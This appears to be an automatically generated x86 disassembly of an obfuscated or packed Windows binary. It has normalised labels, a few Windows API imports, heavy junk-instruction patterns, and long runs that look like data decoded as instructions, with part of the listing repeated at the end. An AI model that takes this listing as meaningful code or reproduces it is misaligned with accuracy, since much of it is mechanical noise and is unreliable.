add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_516ddd
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
push 0x5ee6d28c
cmp ch 0xce
cmp eax 0x7f
pushad
call sub_4ba94a
add [ eax ] al
push edx
inc esp
insb
je rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
rcl [ esi ] 0xe8
salc
and [ eax ] eax
add [ eax ] dl
retn 0xb9
push esi
popad
insb
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
add [ eax ] al
adc dl al
mov ecx 0x65520000
imul esi [ bp + di + 0x74 ] 0x76457265
outsb
je rwxdata
inc ecx
add [ eax - 0x15 ] ch
in al dx
dec edi
in eax 0x66
mov [ esp ] 0x648d9e49
and al 0x4
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
retn 0xec52
outsd
jne rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
push 0x2fba66e8
loopne __import_name_1(USER32:GetProcessWindowStation)
arpl [ ebp + 0x41 ] sp
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
jmp rwxdata
pushad
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
inc edi
je rwxdata
in al dx
inc esp
in eax 0x96
mov esp 0x770346dc
leave
and al 0x6a
in al 0xbc
aas
test [ edx - 0x4e ] dh
jb rwxdata
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
pushfd
jmp rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
push edi
sbb eax 0xbb1e1fb7
dec edx
fimul [ edx ]
arpl [ ebp + 0x73 ] sp
jae rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jb rwxdata
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je rwxdata
jpe rwxdata
jmp rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
outsb
add [ eax ] al
add [ ecx + 0x75 ] dl
jb rwxdata
mov ebx 0x3d2664f3
push edx
and dl [ ebp + 0x68 ]
call 0xffffffffe0812966
sar [ eax - 0x7 ] 0x42
sbb al 0x41
outsd
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
call 0xffffffffcd6d627e
push ebx
jb rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
cld
je rwxdata
dec eax
out dx al
cmp [ ebx + ecx * 8 + 0x60 ] ebp
adc [ esi + 0x10 ] ebx
pop eax
cmp [ ecx + 0x36 ] al
pop esp
sbb al 0x69
pop es
je rwxdata
push ds
test al 0x94
fnsave [ edi + 0xb21ab6d ]
cdq
sbb [ ecx + ebx * 2 - 0x19 ] edi
push ebx
sbb ecx ebp
imul esp [ ebx + 0x65 ] 0x666e6f43
imul esp [ edi + 0x32 ] 0xd0430041
insb
pushad
pop edi
daa
dec edx
ror [ ebx + 0xa ] cl
push 0xffffff8c
sub al 0xdd
0x53366015 0xf62a
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jno rwxdata
dec eax
pushfd
pushfd
shl eax 0x8
pushfd
lodsb [ esi ]
clc
clc
push 0xaa9b9f26
push [ esp + 0x4 ]
not al
bt bp 0xe
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
aad 0x30
test [ edi ] ebx
mov bl 0x45
pop esp
xchg ebx eax
jmp [ esi + 0x7b46c747 ]
or bh al
and [ edx + 0x6a ] esi
out 0x6c al
adc eax 0x35305f46
mov ah 0x11
scasb [ edi ]
or al 0x8c
pop ss
0x4cb03c8b 0xa2ae
mov bh 0x2
push [ esp + 0x1c ]
ror al 0x2
push eax
dec al
clc
mov [ esp + 0xc ] ch
call j_sub_517148
add [ eax ] al
inc edi
je rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
stc
test [ edi ] cl
jae rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
add esp [ eax - 0x18 ]
test eax 0x8dfffb7b
and al 0x24
jb rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x28 ]
je rwxdata
push 0xf84f98d
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
outsw
jb rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
add [ eax + 0x21 ] ch
adc eax eax
push es
popad
je rwxdata
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
call sub_519048
mov dl 0x9a
add [ eax ] al
push 0x6c01121
outsd
outsb
push edi
add al ch
out dx al
adc [ eax ] eax
add [ ebp + 0xf442464 ] cl
xchg edx esi
mov ebp 0x4160fffb
pushfd
inc bl
call sub_4ba811
add [ eax ] al
push edi
jb rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
popad
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
popad
je rwxdata
inc esi
imul ebp [ ebp ] 0x8246488
lea esp [ esp + 0x44 ]
je rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
jb rwxdata
bound esp [ ecx + 0x73 ]
add [ gs : esi - 0x75 ] ah
push ds
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
push 0x7ec010a8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
cli
stc
dec edi
loopne rwxdata
jb rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_516e61
adc al al
call sub_5162c5
push 0x16c021ff
call sub_519048
adc dl al
mov ecx 0x65520000
imul esi [ bp + di + 0x74 ] 0x76457265
outsb
je rwxdata
retn 0xec52
outsd
jne rwxdata
push 0x2fba66e8
loopne __import_name_1(USER32:GetProcessWindowStation)
arpl [ ebp + 0x41 ] sp
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
inc edi
je rwxdata
in al dx
inc esp
in eax 0x96
mov esp 0x770346dc
leave
and al 0x6a
in al 0xbc
aas
test [ edx - 0x4e ] dh
jb rwxdata
push edi
sbb eax 0xbb1e1fb7
dec edx
fimul [ edx ]
arpl [ ebp + 0x73 ] sp
jae rwxdata
jb rwxdata
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je rwxdata
outsb
add [ eax ] al
add [ ecx + 0x75 ] dl
jb rwxdata
mov ebx 0x3d2664f3
push edx
and dl [ ebp + 0x68 ]
call 0xffffffffe0812966
sar [ eax - 0x7 ] 0x42
sbb al 0x41
outsd
call 0xffffffffcd6d627e
push ebx
jb rwxdata
cld
je rwxdata
dec eax
out dx al
cmp [ ebx + ecx * 8 + 0x60 ] ebp
adc [ esi + 0x10 ] ebx
pop eax
cmp [ ecx + 0x36 ] al
pop esp
sbb al 0x69
pop es
je rwxdata
push ds
test al 0x94
fnsave [ edi + 0xb21ab6d ]
cdq
sbb [ ecx + ebx * 2 - 0x19 ] edi
push ebx
sbb ecx ebp
imul esp [ ebx + 0x65 ] 0x666e6f43
imul esp [ edi + 0x32 ] 0xd0430041
insb
pushad
pop edi
daa
dec edx
ror [ ebx + 0xa ] cl
push 0xffffff8c
sub al 0xdd
0x53366015 0xf62a
jno rwxdata
dec eax
pushfd
pushfd
shl eax 0x8
pushfd
lodsb [ esi ]
clc
clc
push 0xaa9b9f26
push [ esp + 0x4 ]
not al
bt bp 0xe
jmp rwxdata
aad 0x30
test [ edi ] ebx
mov bl 0x45
pop esp
xchg ebx eax
jmp [ esi + 0x7b46c747 ]
or bh al
and [ edx + 0x6a ] esi
out 0x6c al
adc eax 0x35305f46
mov ah 0x11
scasb [ edi ]
or al 0x8c
pop ss
0x4cb03c8b 0xa2ae
mov bh 0x2
push [ esp + 0x1c ]
ror al 0x2
push eax
dec al
clc
mov [ esp + 0xc ] ch
call j_sub_517148
add [ eax ] al
inc edi
je rwxdata
stc
test [ edi ] cl
jae rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
add esp [ eax - 0x18 ]
test eax 0x8dfffb7b
and al 0x24
jb rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x28 ]
je rwxdata
push 0xf84f98d
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
outsw
jb rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
add [ eax + 0x21 ] ch
